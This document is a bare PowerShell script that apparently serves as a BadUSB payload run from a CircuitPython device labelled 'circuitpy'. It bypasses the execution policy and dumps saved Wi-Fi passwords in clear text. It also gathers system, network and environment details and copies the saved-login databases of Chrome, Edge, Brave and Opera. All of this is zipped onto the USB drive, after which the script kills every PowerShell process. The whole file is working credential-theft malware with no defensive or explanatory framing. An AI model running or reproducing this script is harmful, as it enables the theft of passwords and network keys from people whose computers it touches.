$s = Get-Volume | Where-Object { $_.FileSystemLabel -eq "circuitpy" }
$f = Join-Path -Path $env:USERPROFILE -ChildPath "i"
$b = $s.DriveLetter + ":\"
if (Test-Path -Path (Join-Path -Path $b -ChildPath "i")) { 
    Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Stop-Process -Force
    return 
}
function TransferFiles {
    $browsers = @(
        @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"; File = "Login Data" },
        @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"; File = "Login Data" },
        @{ Name = "Brave"; Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"; File = "Login Data" },
        @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable"; File = "Login Data" }
    )

    $tempFolder = Join-Path -Path $env:TEMP -ChildPath "BrowserData_$((Get-Date).ToString('yyyyMMddHHmmss'))"
    New-Item -ItemType Directory -Path $tempFolder -Force | Out-Null

    foreach ($browser in $browsers) {
        $sourcePath = $browser.Path
        $file = $browser.File
        $sourceFile = Join-Path -Path $sourcePath -ChildPath $file

        if (Test-Path -Path $sourceFile) {
            $destinationFile = Join-Path -Path $tempFolder -ChildPath "$($browser.Name)_$file"
            Copy-Item -Path $sourceFile -Destination $destinationFile -Force
        }
    }

    $zipFilePath = Join-Path -Path $b -ChildPath "BrowserData_$((Get-Date).ToString('yyyyMMddHHmmss')).zip"
    Compress-Archive -Path $tempFolder\* -DestinationPath $zipFilePath -Force

    Remove-Item -Path $tempFolder -Recurse -Force
}

try { Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force } catch {}

$sections = @{
    "Wi-Fi Profiles"                = {
        $w = netsh wlan show profiles
        foreach ($pr in $w) {
            if ($pr -match 'All User Profile\s+:\s+(.+)') {
                $n = $matches[1]
                $k = (netsh wlan show profile name="$n" key=clear) | Select-String 'Key Content'
                if ($k) { "Profile: $n`nKey Content: $($k.ToString() -replace '.+:\s*', '')`n" }
            }
        }
    }
    "Computer Info"                 = { Get-ComputerInfo }
    "TCP/IP Parameters"             = { Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters' }
    "Operating System Info"         = { Get-CimInstance -ClassName Win32_OperatingSystem }
    "BIOS Info"                     = { Get-WmiObject -Class Win32_BIOS }
    "Environment Variables"         = { Get-ChildItem Env: }
    "Network Interfaces"            = { [System.Net.NetworkInformation.NetworkInterface]::GetAllNetworkInterfaces() }
    "Network Adapters"              = { Get-WmiObject Win32_NetworkAdapter }
    "Network Adapters (NetAdapter)" = { Get-NetAdapter }
    "IP Addresses"                  = { Get-NetIPAddress }
    "Network IP Configuration"      = { Get-NetIPConfiguration }
    "Network Routes"                = { Get-NetRoute }
    "DNS Server Addresses"          = { Get-DnsClientServerAddress }
}

foreach ($section in $sections.GetEnumerator()) {
    "-------------------- $($section.Key) --------------------" | Out-File -Append -FilePath $f
    & $section.Value | Out-File -Append -FilePath $f
}

if (Test-Path -Path $f) {
    $destinationPath = Join-Path -Path $b -ChildPath (Split-Path -Leaf $f)
    TransferFiles
    Move-Item -Path $f -Destination $destinationPath -Force
    $msg = New-Object -ComObject WScript.Shell
    $msg.Popup("Done :D", 2, "System", 64)
}

Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Stop-Process -Force